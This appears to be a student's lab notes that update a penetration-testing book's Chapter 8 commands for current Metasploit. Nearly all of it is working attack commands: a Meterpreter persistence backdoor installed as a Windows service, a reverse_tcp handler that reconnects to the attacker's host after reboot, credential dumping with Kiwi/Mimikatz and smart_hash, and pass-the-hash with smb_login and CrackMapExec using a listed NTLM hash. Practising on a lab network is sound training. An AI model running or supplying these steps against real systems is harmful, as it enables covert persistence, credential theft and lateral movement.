# Chapter 8 Instructions

## Continue from Chapter 7

### Listing 8.1 Installing the Meterpreter autorun backdoor executable

Book says this

```
run persistence -A -L c:\\ -X -i 30 -p 8443 -r 10.0.10.160
```

Do this instead

```
run exploit/windows/local/persistence -A -L c:\\ -X -i 30 -p 8443 -r 10.0.10.211
```

### COOL WAY

First send the current session into the background and remember the session number

```
background
search platforms:windows persistence
use exploit/windows/local/persistence_service
options # To see all your options
set LHOST 10.0.10.211
set LPORT 1234
set SERVICE_NAME iamahacker
set SERVICE_DESCRIPTION I WAS HERE
set SESSION 1
exploit
```

### Listing 8.2 Reestablishing Meterpreter access automatically after system reboot

```
reboot
```

> Create a new file called anythingyouwant.rc

```
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.10.211
set LPORT 1234
run
```

> execture the file by

`msfconsole -r anythingyouwant.rc`

You will be connected to the machine everytime as long as the service is not detected/disabled.

### Listing 8.3 Loading the Mimikatz Meterpreter extension

This won't work anymore

```

load mimikatz
help mimikatz

```

Use this instead

```

load kiwi
help kiwi

```

### Listing 8.4 Retrieving tspkg credentials with Kiwi

```

creds_all

```

### Listing 8.5 Harvesting domain cached credentials

```

run post/windows/gather/smart_hash

```

### Listing 8.9 Passing the hash with Metasploit

```

use auxiliary/scanner/smb/smb_login
set smbuser administrator
set smbpass aad3b435b51404eeaad3b435b51404ee:c1ea09ab1bab83a9c9c1f1c366576737
set smbdomain .
set rhosts 10.0.10.208
set threads 10
run

```

#### Listing 8.10 Using CrackMapExec to pass the hash

```

crackmapexec smb 10.0.10.208 --local-auth -u Administrator -H c1ea09ab1bab83a9c9c1f1c366576737

```

```

```
